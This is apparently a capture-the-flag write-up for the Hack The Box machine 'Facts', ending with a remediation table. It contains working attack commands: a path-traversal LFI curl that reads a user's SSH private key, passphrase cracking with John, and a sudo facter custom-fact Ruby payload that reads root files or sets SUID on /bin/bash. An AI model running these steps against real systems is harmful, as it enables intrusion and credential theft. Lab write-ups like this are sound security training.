<div align="center">

# 📊 HTB: Facts

![OS](https://img.shields.io/badge/OS-Linux-FCC624?style=flat-square&logo=linux&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat-square)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)

`hackthebox` `linux` `rails` `lfi` `ssh-key-cracking` `facter-privesc`

</div>

---

> **TL;DR** — Open admin registration on a Rails app leads to an authenticated LFI that leaks an SSH private key. Crack its passphrase with John, log in, and a sudo-enabled `facter` binary (Puppet's system-info tool) lets you run arbitrary Ruby as root via a custom fact.

## 📋 Box Info

| | |
|---|---|
| 🖥️ **OS** | Linux |
| 🎯 **Target** | `<TARGET_IP>` (facts.htb) |
| 🎚️ **Difficulty** | Easy |
| 📅 **Date** | January 31, 2026 |
| 🏁 **Outcome** | ✅ Full compromise |

## 🔍 Recon

```bash
nmap -sV -sC -p- <TARGET_IP> -T4 --min-rate 5000
```

| Port | Service |
|:---:|---|
| `22` | OpenSSH 9.9p1 (Ubuntu) |
| `80` | nginx 1.26.3 → facts.htb |
| `54321` | MinIO (S3-compatible object storage) |

```bash
echo "<TARGET_IP> facts.htb" | sudo tee -a /etc/hosts
```

The web app is Ruby on Rails (`_factsapp_session` cookie, `x-runtime` timing header). MinIO on 54321 is worth a look too, but the Rails app turns out to be the faster path in.

---

## 🚩 Shell as `trivia`

### Registration → admin, no gate in the way

The app allows open self-registration, and — critically — nothing stops a freshly registered account from landing with admin privileges. Once inside `/admin`, an LFI shows up in the media handler:

```
/admin/media/download_private_file?file=<path>
```

> ⚠️ **Root cause:** the `file` parameter goes straight into a file read with traversal sequences (`../../../../../../`) unfiltered — classic LFI (CWE-22), but gated behind auth that turned out to be trivially obtainable.

### Reading the user flag

```bash
curl -b "_factsapp_session=<cookie>" \
  "http://facts.htb/admin/media/download_private_file?file=../../../../../../home/williams/user.txt"
```

(Note: the username is **`williams`** with an "s" — an earlier guess of `william` returned nothing.)

```
<USER_FLAG_REDACTED>
```

### Escalating the LFI into an SSH key

If it can read one file under `/home`, it can read `.ssh/` too:

```bash
curl -b "_factsapp_session=<cookie>" \
  "http://facts.htb/admin/media/download_private_file?file=../../../../../../home/trivia/.ssh/id_ed25519" \
  > id_ed25519
chmod 600 id_ed25519
```

The key is encrypted with a passphrase. `ssh2john` + `john` makes short work of it:

```bash
ssh2john id_ed25519 > id_ed25519.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_ed25519.hash
```

Cracked in under 3 minutes: **`dragonballz`**

```bash
ssh -i id_ed25519 trivia@<TARGET_IP>
# passphrase: dragonballz
```

Shell as `trivia`.

---

## 👑 Root — Facter Custom-Fact Abuse

```bash
sudo -l
```

```
(root) NOPASSWD: /usr/bin/facter --custom-dir
```

`facter` is Puppet's system-facts tool — and it supports **custom facts** written in Ruby, loaded from a directory you specify with `--custom-dir`. Since `trivia` can run it as root with an arbitrary custom-fact directory, that's arbitrary Ruby execution as root.

> 💡 Any tool that lets you point it at "run this code from this directory" under sudo is a privilege-escalation primitive, regardless of what the tool's actual job is.

```bash
cat > /tmp/exploit.rb << 'EOF'
Facter.add('root_flag') do
  setcode do
    File.read('/root/root.txt')
  end
end
EOF

sudo /usr/bin/facter --custom-dir /tmp root_flag
```

```
<ROOT_FLAG_REDACTED>
```

For a full interactive root shell instead of just a flag read:

```bash
cat > /tmp/shell.rb << 'EOF'
Facter.add('pwn') do
  setcode do
    system('chmod +s /bin/bash')
  end
end
EOF

sudo /usr/bin/facter --custom-dir /tmp pwn
/bin/bash -p
```

---

## 📦 Evidence Index

| Step | Command |
|---|---|
| Full port scan | `nmap -sV -sC -p- <TARGET_IP> -T4 --min-rate 5000` |
| LFI — user flag | `curl .../download_private_file?file=../../../../../../home/williams/user.txt` |
| LFI — SSH key exfil | `curl .../download_private_file?file=../../../../../../home/trivia/.ssh/id_ed25519` |
| Passphrase crack | `ssh2john id_ed25519 \| john --wordlist=rockyou.txt` |
| Privesc | `sudo /usr/bin/facter --custom-dir /tmp root_flag` |

## 🛠️ Remediation

| Finding | Fix |
|---|---|
| Open registration granting admin | Gate admin role assignment behind explicit invite/approval — never default a self-registered account to elevated privileges. |
| Authenticated LFI in media download endpoint | Whitelist file paths server-side; never build filesystem paths directly from user input. |
| SSH private key readable via app-layer LFI | Don't store SSH keys anywhere the web app process can read; restrict `~/.ssh` permissions to the owning user only. |
| Weak SSH key passphrase | Enforce stronger passphrase policy, or better, avoid passphrase-only protection for keys that grant a foothold. |
| `sudo facter --custom-dir` | Remove this sudo grant, or restrict to a read-only, root-owned custom-fact directory the invoking user cannot write to. |

---

<div align="center">

*Part of the [D4RKGUNN3R Hack The Box Walkthroughs](../) series.*

</div>
